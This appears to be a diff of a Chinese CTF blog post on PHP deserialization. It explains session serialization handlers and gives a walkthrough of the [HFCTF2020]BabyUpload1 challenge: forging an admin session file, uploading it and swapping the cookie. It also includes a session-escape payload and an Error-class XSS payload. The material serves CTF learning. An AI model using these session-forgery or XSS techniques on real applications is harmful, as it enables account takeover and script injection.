@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <title>反序列化学习 | Bubble&#39;s blog</title>
 
     <meta charset="utf-8">
@@ -81,13 +81,13 @@
           ·
         </span>
         <span>
-          2345 words
+          5060 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          5 minute read
+          11 minute read
         </span>
     </div>
 
@@ -291,7 +291,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
 </span></span></span></code></pre></div><p>得到</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>string(154) &#34;s:145:&#34;a:3:{s:4:&#34;user&#34;;s:24:&#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;&#34;
-</span></span></code></pre></div><p>过滤机制使user值变为<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>,img替代function成为第二个参数，后面手动添加一个<code>dd</code>成为第三个参数就可以啦，后面的img成功逃逸！</p>
+</span></span></code></pre></div><p>过滤机制使user值变为<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>,img替代function成为第二个参数，后面手动添加一个<code>dd</code>成为第三个参数就可以啦，img成功逃逸！</p>
 <p>payload:</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}
 </span></span></code></pre></div><p>查看页面源代码发现/d0g3_fllllllag</p>
@@ -415,6 +415,414 @@
 <p>得到flag:
 <p class="markdown-image">
   <img src="/img/38.png" alt="alt text"  />
+</p></p>
+<p><strong>SESSION反序列化</strong></p>
+<ol>
+<li><strong>session相关组件解释：</strong></li>
+</ol>
+<ul>
+<li>session_start()</li>
+</ul>
+<p>session_start()函数是启动新会话或者重用现有会话的第一步。</p>
+<ul>
+<li>sess_PHPSESSID</li>
+</ul>
+<p>sess_PHPSESSID是Cookie名称的一个常见示例，用于存储Session ID。这个名称可以在php.ini配置文件中通过session.name指令进行自定义。</p>
+<ul>
+<li>Set-Cookie</li>
+</ul>
+<p>Set-Cookie是一个HTTP响应头部，用于向客户端发送Cookie。</p>
+<ul>
+<li>$_SESSION</li>
+</ul>
+<p>$_SESSION是一个超全局变量，存储与Session ID相关联的Session数据，允许php脚本访问和修改这些数据。</p>
+<ol start="2">
+<li><strong>原理</strong></li>
+</ol>
+<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。</p>
+<p>如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
+<p>而之所以能利用session反序列化，是因为session序列化和反序列化时的引擎不同</p>
+<ol start="3">
+<li><strong>PHP Session在php.ini中相关配置项</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">配置项</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">session.save_handler</td>
+<td style="text-align:center">设定用户自定义session存储函数,默认为files</td>
+</tr>
+<tr>
+<td style="text-align:center">session.save_path</td>
+<td style="text-align:center">设置session存储路径，默认在/tmp</td>
+</tr>
+<tr>
+<td style="text-align:center">session.serialize_handler</td>
+<td style="text-align:center">设定(反)序列化处理器,默认为php</td>
+</tr>
+<tr>
+<td style="text-align:center">session.auto_start</td>
+<td style="text-align:center">指定会话模块是否在请求开始时启动一个会话，默认为0不启动</td>
+</tr>
+<tr>
+<td style="text-align:center">session.upload_progress.enabed</td>
+<td style="text-align:center">将上传文件的进度信息存储在session中。默认开启</td>
+</tr>
+<tr>
+<td style="text-align:center">session.upload_progress.cleanup</td>
+<td style="text-align:center">一旦读取了所有的POST数据，立即清除进度信息。默认开启</td>
+</tr>
+</tbody>
+</table>
+<p><p class="markdown-image">
+  <img src="/img/41.png" alt="alt text"  />
+</p></p>
+<ol start="4">
+<li><strong>Session 三种序列化方式</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">存储引擎</th>
+<th style="text-align:center">存储方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">php_binary</td>
+<td style="text-align:center">键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值</td>
+</tr>
+<tr>
+<td style="text-align:center">php</td>
+<td style="text-align:center">键名 + 竖线 + 经过 serialize() 函数序列处理的值</td>
+</tr>
+<tr>
+<td style="text-align:center">php_serialize</td>
+<td style="text-align:center">(PHP&gt;5.5.4) 经过 serialize() 函数序列化处理的数组</td>
+</tr>
+</tbody>
+</table>
+<p><strong>[HFCTF2020]BabyUpload1</strong></p>
+<p>题目源码：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#666">0</span>);
+</span></span><span style="display:flex;"><span>session_save_path(<span style="color:#b44">&#34;/var/babyctf/&#34;</span>);
+</span></span><span style="display:flex;"><span>session_start();
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">require_once</span> <span style="color:#b44">&#34;/flag&#34;</span>;
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">===</span><span style="color:#b44">&#39;admin&#39;</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filename</span><span style="color:#666">=</span><span style="color:#b44">&#39;/var/babyctf/success.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span>(file_exists(<span style="color:#b8860b">$filename</span>)){
+</span></span><span style="display:flex;"><span>            safe_delete(<span style="color:#b8860b">$filename</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">die</span>(<span style="color:#b8860b">$flag</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">=</span><span style="color:#b44">&#39;guest&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$direction</span> <span style="color:#666">=</span> filter_input(INPUT_POST, <span style="color:#b44">&#39;direction&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$attr</span> <span style="color:#666">=</span> filter_input(INPUT_POST, <span style="color:#b44">&#39;attr&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$dir_path</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;/var/babyctf/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$attr</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$attr</span><span style="color:#666">===</span><span style="color:#b44">&#34;private&#34;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$dir_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;upload&#34;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>is_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>])){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid upload&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;_&#34;</span><span style="color:#666">.</span>hash_file(<span style="color:#b44">&#34;sha256&#34;</span>,<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>mkdir(<span style="color:#b8860b">$dir_path</span>, <span style="color:#666">0700</span>, <span style="color:#a2f;font-weight:bold">TRUE</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(move_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>],<span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;uploaded&#34;</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#a2f;font-weight:bold">elseif</span> (<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;download&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$filename</span> <span style="color:#666">=</span> basename(filter_input(INPUT_POST, <span style="color:#b44">&#39;filename&#39;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$filename</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>file_exists(<span style="color:#b8860b">$file_path</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;file not exist&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Type: application/force-download&#39;</span>);
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Length: &#39;</span><span style="color:#666">.</span>filesize(<span style="color:#b8860b">$file_path</span>));
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#666">.</span>substr(<span style="color:#b8860b">$filename</span>, <span style="color:#666">0</span>, <span style="color:#666">-</span><span style="color:#666">65</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;&#34;&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(readfile(<span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;downloaded&#34;</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>进行代码审计</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>] <span style="color:#666">===</span><span style="color:#b44">&#39;admin&#39;</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filename</span><span style="color:#666">=</span><span style="color:#b44">&#39;/var/babyctf/success.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span>(file_exists(<span style="color:#b8860b">$filename</span>)){
+</span></span><span style="display:flex;"><span>            safe_delete(<span style="color:#b8860b">$filename</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">die</span>(<span style="color:#b8860b">$flag</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>由以上代码可以知道获得flag条件：</p>
+<ol>
+<li>
+<p>username === &lsquo;admin&rsquo;</p>
+</li>
+<li>
+<p>存在success.txt文件</p>
+</li>
+</ol>
+<p>再来看upload和download两个功能：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;upload&#34;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>is_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>])){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid upload&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">.=</span> <span style="color:#b44">&#34;_&#34;</span><span style="color:#666">.</span>hash_file(<span style="color:#b44">&#34;sha256&#34;</span>,<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>mkdir(<span style="color:#b8860b">$dir_path</span>, <span style="color:#666">0700</span>, <span style="color:#a2f;font-weight:bold">TRUE</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(move_uploaded_file(<span style="color:#b8860b">$_FILES</span>[<span style="color:#b44">&#39;up_file&#39;</span>][<span style="color:#b44">&#39;tmp_name&#39;</span>],<span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;uploaded&#34;</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$upload_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>upload可以上传文件到/var/babyctf/目录下，上传后的文件名在末尾加上了哈希值，同时也有一些过滤，不过没啥影响。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">elseif</span> (<span style="color:#b8860b">$direction</span> <span style="color:#666">===</span> <span style="color:#b44">&#34;download&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$filename</span> <span style="color:#666">=</span> basename(filter_input(INPUT_POST, <span style="color:#b44">&#39;filename&#39;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$file_path</span> <span style="color:#666">=</span> <span style="color:#b8860b">$dir_path</span><span style="color:#666">.</span><span style="color:#b44">&#34;/&#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$filename</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(preg_match(<span style="color:#b44">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span>, <span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;invalid file path&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span>file_exists(<span style="color:#b8860b">$file_path</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;file not exist&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Type: application/force-download&#39;</span>);
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Length: &#39;</span><span style="color:#666">.</span>filesize(<span style="color:#b8860b">$file_path</span>));
+</span></span><span style="display:flex;"><span>        header(<span style="color:#b44">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style="color:#666">.</span>substr(<span style="color:#b8860b">$filename</span>, <span style="color:#666">0</span>, <span style="color:#666">-</span><span style="color:#666">65</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;&#34;&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(readfile(<span style="color:#b8860b">$file_path</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b44">&#34;downloaded&#34;</span>;
+</span></span><span style="display:flex;"><span>        }<span style="color:#a2f;font-weight:bold">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">throw</span> <span style="color:#a2f;font-weight:bold">new</span> RuntimeException(<span style="color:#b44">&#39;error while saving&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#a2f;font-weight:bold">catch</span> (RuntimeException <span style="color:#b8860b">$e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$download_result</span> <span style="color:#666">=</span> <span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">getMessage</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>download可以读取var/babyctf/目录下任意文件filename</p>
+<p>wp:</p>
+<p>首先先传direction=download，F12得到session值</p>
+<p><p class="markdown-image">
+  <img src="/img/42.png" alt="alt text"  />
+</p></p>
+<p><em>session文件命名方式为sess_PHPSESSID</em>,此时可以传filename查看session文件</p>
+<p><p class="markdown-image">
+  <img src="/img/43.png" alt="alt text"  />
+</p></p>
+<p>反序列化内容既没有<code>|</code>也没有<code>{}</code>,判断是采用php_binary的存储方式，修改php.ini让本地php环境支持php_binary，<del>记得重启Apache</del></p>
+<p><p class="markdown-image">
+  <img src="/img/44.png" alt="alt text"  />
+</p></p>
+<p>然后本地编写脚本上传admin信息</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>session_start();
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(isset(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>])){
+</span></span><span style="display:flex;"><span>	<span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;username&#39;</span>]<span style="color:#666">=</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>运行代码传?name=admin后在tmp目录可以看到生成了对应session文件</p>
+<p><p class="markdown-image">
+  <img src="/img/45.png" alt="alt text"  />
+</p></p>
+<p>修改文件名为sess并计算该文件的哈希值：</p>
+<p><p class="markdown-image">
+  <img src="/img/46.png" alt="alt text"  />
+</p></p>
+<blockquote>
+<p>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
+</blockquote>
+<p>编写上传代码上传admin的sess文件：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;</span>form action<span style="color:#666">=</span><span style="color:#b44">&#34;http://0beb395b-65d0-4163-90d0-7ddeb1ecb427.node4.buuoj.cn:81/&#34;</span> method<span style="color:#666">=</span><span style="color:#b44">&#34;post&#34;</span> enctype<span style="color:#666">=</span><span style="color:#b44">&#34;multipart/form-data&#34;</span><span style="color:#666">&gt;</span>
+</span></span><span style="display:flex;"><span>  file<span style="color:#666">:</span> <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;file&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;up_file&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;submit&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;Send&#34;</span><span style="color:#666">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;text&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;direction&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;upload&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#666">&lt;</span>input type<span style="color:#666">=</span><span style="color:#b44">&#34;text&#34;</span> name<span style="color:#666">=</span><span style="color:#b44">&#34;attr&#34;</span> value<span style="color:#666">=</span><span style="color:#b44">&#34;&#34;</span><span style="color:#666">/&gt;&lt;</span>br<span style="color:#666">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#666">&lt;/</span>form<span style="color:#666">&gt;</span>
+</span></span></code></pre></div><p>上传成功后只需要改cookie值为admin登陆时的cookie：
+<p class="markdown-image">
+  <img src="/img/47.png" alt="alt text"  />
+</p></p>
+<p>最后传参时加上attr=succcess.txt就可以拿到flag啦~~</p>
+<p><p class="markdown-image">
+  <img src="/img/48.png" alt="alt text"  />
+</p></p>
+<p><strong>PHP原生类序列化</strong></p>
+<p>下面简单介绍ctf中常见原生类及部分类用法：</p>
+<blockquote>
+<p>Error/Exception类</p>
+</blockquote>
+<blockquote>
+<p>SoapClient类</p>
+</blockquote>
+<blockquote>
+<p>DirectoryIterator/FilesystemIterator类</p>
+</blockquote>
+<blockquote>
+<p>SplFileObject类</p>
+</blockquote>
+<blockquote>
+<p>SimpleXMLElement</p>
+</blockquote>
+<blockquote>
+<p>ZipArchive类</p>
+</blockquote>
+<ol>
+<li>Error/Exception类的利用</li>
+</ol>
+<ul>
+<li>Error XSS:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php  
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> unserialize(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;cmd&#39;</span>]);  
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>使用Error类可以用来弹xss:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Error(<span style="color:#b44">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span>);
